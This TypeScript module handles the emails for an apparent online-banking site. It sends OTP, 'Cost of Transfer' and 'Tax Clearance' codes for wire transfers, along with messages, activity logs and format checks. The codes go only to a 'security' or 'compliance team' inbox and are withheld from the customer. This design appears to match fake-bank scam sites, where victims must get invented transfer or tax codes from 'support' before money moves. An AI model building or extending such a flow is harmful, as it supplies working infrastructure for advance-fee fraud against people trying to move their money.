/**
 * Email Service - Secure OTP and Verification Code Delivery
 * Codes are sent to customer service email only - NOT displayed in UI
 */

export interface EmailOptions {
  to: string
  subject: string
  type: "otp" | "cot" | "tax" | "security-token" | "signup-token"
  userName: string
  amount?: string
  recipientName?: string
  recipientBank?: string
  wireType?: string
  transactionDetails?: Record<string, string>
}

export interface TokenEmailOptions {
  userEmail: string
  adminEmail: string
  userName: string
  tokenType: "login" | "signup" | "password-reset"
}

export interface EmailResult {
  success: boolean
  messageId: string
  timestamp: Date
  status: "sent" | "failed"
  error?: string
}

/**
 * Send verification code to customer service email only
 * Does NOT include the actual code in UI notifications
 */
export async function sendVerificationCodeEmail(options: EmailOptions): Promise<EmailResult> {
  const { to, subject, type, userName, amount, recipientName, recipientBank, wireType } = options

  try {
    // This simulates sending to backend email service
    // In production, this would call an API endpoint that uses a real email provider
    const response = await fetch("/api/email/send-verification", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        to,
        subject,
        type,
        userName,
        amount,
        recipientName,
        recipientBank,
        wireType,
        timestamp: new Date().toISOString(),
      }),
    })

    if (!response.ok) {
      throw new Error(`Email service returned ${response.status}`)
    }

    const data = await response.json()

    return {
      success: true,
      messageId: data.messageId || `msg_${Date.now()}`,
      timestamp: new Date(),
      status: "sent",
    }
  } catch (error) {
    console.error("[Email Service] Failed to send verification code:", error)

    return {
      success: false,
      messageId: "",
      timestamp: new Date(),
      status: "failed",
      error: error instanceof Error ? error.message : "Failed to send email",
    }
  }
}

/**
 * Generate generic email message without showing the code
 * Used for toast notifications and UI messages
 */
export function getGenericVerificationMessage(type: "otp" | "cot" | "tax", email: string): string {
  const messages = {
    otp: `One-Time Password sent to our security team at ${email}. You will receive the code via secure channel.`,
    cot: `Cost of Transfer code sent to our compliance team at ${email}. You will receive the code via secure channel.`,
    tax: `Tax Clearance code sent to our compliance team at ${email}. You will receive the code via secure channel.`,
  }

  return messages[type]
}

/**
 * Log verification code sending to activity without exposing the code
 */
export function getVerificationActivity(
  type: "otp" | "cot" | "tax",
  email: string,
  amount?: string,
  recipient?: string,
): string {
  const types = {
    otp: "OTP Verification",
    cot: "Cost of Transfer Verification",
    tax: "Tax Clearance Verification",
  }

  let description = `${types[type]} code sent to ${email}`

  if (amount && recipient) {
    description += ` for $${amount} transfer to ${recipient}`
  }

  return description
}

/**
 * Validate that a code matches expected format (client-side only)
 * Does NOT validate against actual code - server-side validation happens at API
 */
export function validateCodeFormat(code: string, type: "otp" | "cot" | "tax"): boolean {
  const formats = {
    otp: /^\d{6}$/, // 6 digits
    cot: /^[A-Z0-9]{5,6}$/, // 5-6 alphanumeric
    tax: /^[A-Z0-9\-]{6,12}$/, // 6-12 alphanumeric with hyphens
  }

  return formats[type].test(code)
}

/**
 * Send security token to both user email and admin email
 * Token is NOT displayed in UI - only sent via email
 */
export async function sendSecurityTokenEmail(options: TokenEmailOptions): Promise<EmailResult> {
  const { userEmail, adminEmail, userName, tokenType } = options

  try {
    console.log("[v0] Sending security token to user and admin emails")

    const response = await fetch("/api/email/send-token", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        userEmail,
        adminEmail,
        userName,
        tokenType,
        timestamp: new Date().toISOString(),
      }),
    })

    if (!response.ok) {
      throw new Error(`Token email service returned ${response.status}`)
    }

    const data = await response.json()

    console.log("[v0] Security token email sent successfully")

    return {
      success: true,
      messageId: data.messageId || `token_${Date.now()}`,
      timestamp: new Date(),
      status: "sent",
    }
  } catch (error) {
    console.error("[v0] Failed to send security token email:", error)

    return {
      success: false,
      messageId: "",
      timestamp: new Date(),
      status: "failed",
      error: error instanceof Error ? error.message : "Failed to send token email",
    }
  }
}

/**
 * Get user message when token is sent via email
 * Does not display the actual token
 */
export function getTokenSentMessage(userEmail: string, tokenType: string): string {
  const messages: Record<string, string> = {
    login: `Security token sent to ${userEmail}. Check your email for the 6-digit code and enter it within 60 seconds.`,
    signup: `Welcome! A security token has been sent to ${userEmail}. Use the code to verify your new account.`,
    "password-reset": `Password reset token sent to ${userEmail}. Check your email for the verification code.`,
  }

  return messages[tokenType] || `Security token sent to ${userEmail}. Check your email for the code.`
}
